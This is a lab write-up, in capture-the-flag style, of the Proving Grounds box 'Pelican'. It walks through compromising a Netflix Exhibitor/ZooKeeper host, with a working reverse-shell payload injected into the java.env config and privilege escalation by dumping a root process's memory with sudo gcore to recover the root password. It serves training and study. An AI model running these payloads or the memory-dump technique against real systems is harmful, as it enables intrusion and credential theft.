# Pelican  (Proving Grounds Practice · Linux · Intermediate)

- **IP:** 192.168.123.98   **Date:** 2026-10-12
- **One-line:** Netflix **Exhibitor** web UI (`java.env` config-injection) → RCE as *charles* → `sudo gcore` to dump the memory of a root process literally named **`password-store`** → read the root password out of memory → `su root`.

---

## 1. Enumeration

```bash
nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
nmap -p22,139,445,631,2181,2222,8080,8081,34051 -sCV -Pn -oN scans/services.txt $IP
```
| Port | Service | Note |
|---|---|---|
| 22 / 2222 | OpenSSH 7.9 | two SSH ports (same host key) |
| 139/445 | Samba 4.9.5 | guest; nothing useful here |
| 631 | CUPS 2.2 | 🐇 distraction |
| **2181** | **Apache ZooKeeper 3.4.6** | managed by Exhibitor |
| **8080** | Jetty → **`/exhibitor/v1/ui/index.html`** | 🎯 **Netflix Exhibitor** |
| 8081 | nginx | just redirects to the Exhibitor UI on 8080 |
| 34051 | Java RMI | not needed |

**🔑 How I identified the foothold:** the 8081→8080 redirect pointed at **`/exhibitor/v1/ui/`**. The word **`exhibitor`** in the path is a *product name*, not a generic route — and ZooKeeper sits right next to it on 2181. Googling **"exhibitor zookeeper"** → **Netflix Exhibitor** (a ZK supervisor with a web config UI). Then **"exhibitor RCE"** → the `java.env` config-injection. *Method, not memory: unfamiliar string in output → Google it → that's the product → search its exploits.*

## 2. Foothold (user = charles)

**Vector:** Netflix Exhibitor lets you edit a **`java.env`** script in its Config tab. Exhibitor writes that to a file that ZooKeeper **sources (executes)** on restart → arbitrary command execution as the user running Exhibitor (*charles*).

**Steps:**
```bash
# 1) Kali listener:
nc -lvnp 443
# 2) Exhibitor UI → http://192.168.123.98:8080/exhibitor/v1/ui/index.html → Config tab → toggle Editing on
#    put this in the java.env field:
$(/bin/bash -i >& /dev/tcp/<KALI-IP>/443 0>&1)
# 3) Commit the config, then Restart ZooKeeper from the Exhibitor controls → java.env runs → shell lands
```
Landed as **`charles`** (uid=1000) in `/opt/zookeeper`.
- **local.txt:** `[captured]`

**Stabilise immediately** (learned the hard way — see rabbit holes):
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # Ctrl+Z → stty raw -echo; fg → Enter → export TERM=xterm
```

## 3. Privilege Escalation (root)

**Dead-end first (and that's fine):** `getcap -r /` showed only `cap_net_raw` (ping), `cap_ipc_lock` (keyring), `cap_net_bind/admin` (gstreamer) — **none exploitable.** No `cap_setuid` on a code-running binary. *Lesson: don't force a technique; empty vector → next one.*

**The real path — `sudo gcore`:**
```bash
sudo -l
#   (ALL) NOPASSWD: /usr/bin/gcore      ← charles can run gcore as ROOT
```
**Why this = root:** `gcore` dumps the **memory of a running process** to a file. With `sudo`, you can dump **any** process — including root-owned ones — and process memory is full of **secrets**. So: find a privileged process holding a credential → dump it → `strings` the dump → read the secret.

```bash
ps aux
#   root  494  /usr/bin/password-store   ← a root process LITERALLY named "password-store"
sudo /usr/bin/gcore -o /tmp/dump 494                        # dump its memory (as root)
strings /tmp/dump.494 | grep -i -A5 -B2 'Password'          # → "Password: root:" + the value next to it
```
That revealed the **root password**. Then:
```bash
su root        # paste the recovered password  (needs a STABLE shell — see rabbit holes)
id             # uid=0(root) 🎉
cat /root/proof.txt
```
- **proof.txt:** `[captured]`

## 4. Learnings & tips
- **Recognition by product name.** `/exhibitor/` in a URL = the product Exhibitor. Unfamiliar string → Google it → find its exploit. You don't need to know every app.
- **"What does this tool DO as root?"** When `sudo -l` gives an *odd* binary, reason about its capability. `gcore` dumps memory → memory holds secrets → dump a secret-holding root process → read the credential. This mindset cracks weird privescs that aren't on GTFOBins.
- **`ps aux` names are clues.** A process called `password-store` is a giant arrow. Read process lists for intent.
- **Don't force a technique.** Capabilities looked promising but were a dead end — pivoting to `sudo -l` found the real path in seconds.

## 5. Rabbit holes / mistakes (so I don't repeat them)
- ⚠️ **Ctrl+C killed my reverse shell.** In an unstabilised shell there's no job control, so **Ctrl+C drops the whole connection.** After that, commands I typed ran on **Kali** by mistake (`gcore: command not found`, `No such file`). → **Always stabilise (python pty + `stty raw -echo`) before doing anything, and never Ctrl+C a raw shell.**
- ⚠️ **`su` needs a real TTY.** In a dumb shell the password prompt misbehaves → stabilise first, *then* `su root`.
- ⚠️ **SSH-key route hit a booby-trapped login.** Planting my key worked (auth succeeded), but charles's login ran a bogus `foo` command and the server denied a PTY (`PTY allocation request failed`) → session died. Bypass = `ssh -i key charles@IP -tt "bash --noprofile --norc"`. In the end, **restarting the lab + re-running the Exhibitor reverse shell** (then stabilising) was the clean way back in.
- 🐇 Ignore CUPS (631), Java RMI (34051), Samba — all distractions on this box.

## 6. KB tags used
- `[ENUM-UNUSUAL-PORTS]` (identify Exhibitor) · `[WEB-QUICK]` · `[SHELL-QUICK]` / `[SHELL-STABILIZE]` (the Ctrl+C lesson) · `[REVERSE-SHELL-NOT-CONNECTING]` · `[LINUX-SUDO]` (sudo gcore) · `[LINUX-CAP]` (the dead-end check) · `[LINUX-CREDS]` · `[FLAG-HUNT]`
